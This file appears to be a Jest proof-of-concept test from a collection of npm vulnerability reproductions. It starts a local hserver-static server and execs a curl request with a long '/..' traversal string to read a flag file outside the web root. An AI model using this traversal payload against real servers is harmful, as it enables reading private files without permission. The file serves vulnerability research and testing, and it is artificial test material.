'use strict';
//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/hserver-static/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in hserver-static", (done) => {
    const Hserver = require('hserver');
    const Hstatic = require('hserver-static');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    const port = 8990;
    const app = new Hserver();
    
    // logger
    app.use(function (next) {
        const start = new Date;
        this.res.once('finish', () => {
            const ms = new Date - start;
            console.log('%s %s %s - time:%s', this.status, this.method, this.url, ms);
        });
        next();
    });
    // static middleware
    app.use(Hstatic({
        router: '/',
        root: 'www',
        index: 'index.html',
        method: ['GET', 'HEAD'],
        zip: true,
        cache: 7200,
        etag: true
    }));
    app.listen(port);
    console.log(`Server is running at http://127.0.0.1:${port}/`);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8990${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
